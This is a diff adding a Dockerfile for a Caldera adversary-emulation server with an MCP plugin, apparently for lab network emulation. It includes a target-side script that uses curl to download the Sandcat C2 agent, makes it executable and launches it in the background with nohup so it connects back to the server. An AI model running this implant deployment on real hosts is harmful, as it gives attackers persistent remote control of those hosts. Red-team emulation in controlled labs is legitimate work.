@@ -1,0 +1,101 @@
+# CORE-Compatible Caldera with MCP Plugin
+# Based on latest Caldera from GitHub with MCP plugin for AI-powered adversary emulation
+#
+# Build: docker build -t caldera-mcp-core -f Dockerfile.core .
+#
+# Ports:
+#   8888 - Caldera Web UI
+#   7010 - HTTP C2 contact
+#   7011 - UDP C2 contact
+#   7012 - TCP C2 contact
+#   8022 - SSH tunnel
+#   5000 - MLflow tracking (MCP plugin)
+
+# Stage 1: Build the UI
+FROM node:23 AS ui-build
+WORKDIR /usr/src/app
+COPY . .
+RUN cd plugins/magma && npm install && npm run build
+
+# Stage 2: Runtime with CORE compatibility
+FROM debian:bookworm-slim
+
+# Install system dependencies
+RUN apt-get update && apt-get install -y --no-install-recommends \
+    python3 \
+    python3-pip \
+    python3-venv \
+    git \
+    curl \
+    wget \
+    # CORE networking requirements
+    iproute2 \
+    ethtool \
+    iputils-ping \
+    net-tools \
+    tcpdump \
+    # Additional useful tools
+    procps \
+    vim-tiny \
+    && rm -rf /var/lib/apt/lists/*
+
+# Set up app directory
+WORKDIR /opt/caldera
+
+# Copy application files
+COPY --from=ui-build /usr/src/app .
+
+# Create virtual environment and install Python dependencies
+RUN python3 -m venv /opt/caldera/venv && \
+    /opt/caldera/venv/bin/pip install --upgrade pip && \
+    /opt/caldera/venv/bin/pip install -r requirements.txt && \
+    # Install MCP plugin requirements if they exist
+    if [ -f plugins/mcp/requirements.txt ]; then \
+        /opt/caldera/venv/bin/pip install -r plugins/mcp/requirements.txt; \
+    fi
+
+# Create startup script to launch Caldera (run manually or via CORE service)
+RUN echo '#!/bin/bash\n\
+cd /opt/caldera\n\
+source /opt/caldera/venv/bin/activate\n\
+exec python3 server.py --insecure "$@"\n\
+' > /start-caldera.sh && chmod +x /start-caldera.sh
+
+# Create Sandcat agent deployment script (to be run on target hosts)
+# Usage: /deploy-sandcat.sh <caldera-server-ip>
+RUN echo '#!/bin/bash\n\
+# Sandcat Agent Deployment Script\n\
+# Downloads and runs Sandcat agent connecting to specified Caldera server\n\
+\n\
+CALDERA_IP="${1:-10.0.1.2}"\n\
+CALDERA_PORT="${2:-8888}"\n\
+GROUP="${3:-red}"\n\
+\n\
+SERVER="http://${CALDERA_IP}:${CALDERA_PORT}"\n\
+\n\
+echo "Deploying Sandcat agent..."\n\
+echo "  Caldera Server: ${SERVER}"\n\
+echo "  Group: ${GROUP}"\n\
+\n\
+# Download sandcat agent\n\
+curl -s -X POST -H "file:sandcat.go" -H "platform:linux" "${SERVER}/file/download" -o /tmp/sandcat\n\
+\n\
+if [ -f /tmp/sandcat ]; then\n\
+    chmod +x /tmp/sandcat\n\
+    echo "Starting Sandcat agent in background..."\n\
+    nohup /tmp/sandcat -server "${SERVER}" -group "${GROUP}" -v > /tmp/sandcat.log 2>&1 &\n\
+    echo "Sandcat PID: $!"\n\
+    echo "Agent deployed successfully!"\n\
+else\n\
+    echo "ERROR: Failed to download Sandcat agent from ${SERVER}"\n\
+    exit 1\n\
+fi\n\
+' > /deploy-sandcat.sh && chmod +x /deploy-sandcat.sh
+
+# Expose ports
+EXPOSE 8888 7010 7011/udp 7012 8022 5000
+
+# NO ENTRYPOINT - let CORE control the container
+# CORE runs: docker run ... <image> tail -f /dev/null
+# To start Caldera inside CORE, run: /start-caldera.sh
+# To deploy Sandcat on targets, run: /deploy-sandcat.sh <caldera-ip>
